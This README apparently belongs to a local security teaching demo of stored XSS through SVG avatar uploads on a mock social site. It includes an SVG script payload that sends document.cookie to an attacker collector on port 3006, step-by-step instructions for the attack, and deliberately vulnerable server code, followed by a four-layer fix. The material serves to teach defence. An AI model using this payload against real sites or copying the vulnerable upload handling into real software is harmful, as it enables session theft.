# SVG Upload XSS — ConnectHub Profile Avatar

## Port Reference

| Port | Role | File | npm script |
|------|------|------|------------|
| 3005 | Vulnerable victim | `victim-server.js` | `npm run victim` |
| 3006 | Attacker collector | `attacker-server.js` | `npm run attacker` |
| 3007 | Protected victim | `victim-server-protected.js` | `npm run victim-protected` |

## Attack Flow

```
Attacker uploads profile photo: avatar.svg
  (SVG contains: <script>fetch('//3006?c='+document.cookie)</script>)
        ↓ (stored as a static file, served at /uploads/avatar.svg)
Victim views attacker's ConnectHub profile (3005)
        ↓
Browser fetches and renders the SVG inline — executes embedded <script>
        ↓
Victim's cookie sent to attacker collector (3006)
```

## What It Is

The frontend HTML is 100% clean — no `innerHTML`, no reflected parameters. The vulnerability is the server's **file-serving policy**. SVG is a full XML+JavaScript runtime. When served directly as a URL (not embedded in `<img>`), the browser renders it as a document with script execution in the same origin as the serving domain.

This illustrates that XSS is not always a frontend developer mistake. A perfectly written React or vanilla JS application can still be vulnerable if the server serves user-uploaded SVG files without policy headers.

## How to Run

1. Terminal 1: `cd demo-attacked/xss/svg-upload && npm run victim`
2. Terminal 2: `cd demo-attacked/xss/svg-upload && npm run attacker`
3. Open `http://localhost:3006` — attacker dashboard. Click "⬇ Download payload.svg".
4. Open `http://localhost:3005` — ConnectHub.
5. Upload `payload.svg` as your profile avatar via the upload form.
6. Your profile card appears in the community grid with a teal-colored avatar (looks normal).
7. Click "View Profile →" on your profile card. A modal opens.
8. Click "🔍 View Full Photo". The raw SVG URL opens in a new tab.
9. The script inside the SVG fires. Cookie appears on the attacker dashboard.

**Why the `<img>` tag is safe:** The community grid shows avatars via `<img src="...">`. Browsers sandbox SVG scripts inside `<img>` — they never execute. Scripts run only when the SVG URL is opened as a standalone tab (or via `<object>`, `<embed>`, or `<iframe>`).

## Vulnerable Code — Exact Lines

**`victim-server.js`**

Cookie without HttpOnly:

```js
res.setHeader('Set-Cookie', 'member_session=MemberSarah_t0k3n_DEF012; Path=/')
```

Multer accepts all file types:

```js
const upload = multer({ storage, limits: { fileSize: 5 * 1024 * 1024 } });
// No fileFilter — any file type accepted, including .svg files.
```

Uploads served with no policy headers:

```js
app.use('/uploads', express.static(UPLOADS_DIR));
// For .svg: Content-Type: image/svg+xml — no Content-Disposition, no CSP.
```

**`victim.html`** — the `window.open` call:

```js
window.open(profile.avatarUrl, '_blank')
// Opening the SVG URL directly removes the <img> sandbox. Scripts run.
```

## Why These Lines Are Dangerous

An SVG file is a valid XML document with a `<script>` element defined in the SVG spec. Browsers execute SVG scripts when rendered as a top-level document but NOT when loaded via `<img>`. The server assigns `localhost:3005` as the origin. The script runs with full access to `document.cookie` for that origin.

## The Fix — Four Layers

**`victim-server-protected.js`** (port 3007)

**Layer 1** — Extension and MIME allowlist:

```js
function rasterOnlyFilter(req, file, cb) {
  if (!ALLOWED_EXTENSIONS.has(ext) || !ALLOWED_MIMETYPES.has(file.mimetype)) {
    return cb(new Error('Only JPG, PNG, GIF, and WebP images are allowed.'));
  }
}
// Blocks honest SVG uploads. NOT sufficient alone — attackers rename payload.svg to payload.jpg.
```

**Layer 2** — Magic bytes check:

```js
function matchesMagicBytes(buffer) {
  if (buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff) return true; // JPEG
  // PNG, GIF, WebP checks...
}
// Renamed SVG fails — bytes start with <?xml or <svg, not image magic bytes.
```

**Layer 2b** — Content sniff:

```js
function containsExecutableMarkup(buffer) {
  const head = buffer.slice(0, 4096).toString('utf8').toLowerCase();
  return head.includes('<?xml') || head.includes('<svg') || head.includes('<script');
}
```

**Layer 3** — Sharp re-encoding (strongest):

```js
await sharp(filePath).rotate().jpeg({ quality: 85 }).toFile(outputPath);
fs.unlinkSync(filePath); // delete original
// Sharp decodes pixel data and writes a brand-new JPEG from scratch.
// EXIF, comments, and polyglot payloads are destroyed in the process.
```

**Layer 4** — Safe file serving headers:

```js
app.use('/uploads', function (req, res, next) {
  res.setHeader('Content-Disposition', 'attachment');
  res.setHeader('Content-Security-Policy', "default-src 'none'");
  next();
}, express.static(UPLOADS_DIR));
```

## Edge Cases

- **`<object>` and `<embed>` are NOT sandboxed like `<img>`:** Audit all elements that load user-uploaded files.
- **Extension allowlist bypassed by polyglot files:** A valid JPEG with script in EXIF passes magic bytes. Sharp re-encoding is the reliable defense.
- **Content-Disposition: attachment is browser-dependent:** Users can sometimes bypass via "Open in new tab". CSP provides a second layer.
- **Separate cookieless domain is the strongest architectural defense:** Serve uploads from a dedicated asset domain with no `Set-Cookie` responses. GitHub uses `avatars.githubusercontent.com` for exactly this reason.
- **X-Content-Type-Options: nosniff:** Prevents MIME-sniffing away from the declared Content-Type.

## This Demo in Real Frameworks

This attack has nothing to do with the frontend framework. The vulnerability is entirely server-side:

1. Server accepts SVG as a valid upload type
2. Server serves it without `Content-Disposition: attachment` or CSP

It does not matter whether the frontend is React, Angular, Vue, Next.js, or plain HTML. An Angular or Next.js app with the same upload endpoint and the same static file serving policy is equally vulnerable. The fix (Sharp re-encoding, `Content-Disposition`, separate CDN domain) lives on the server and is framework-agnostic.
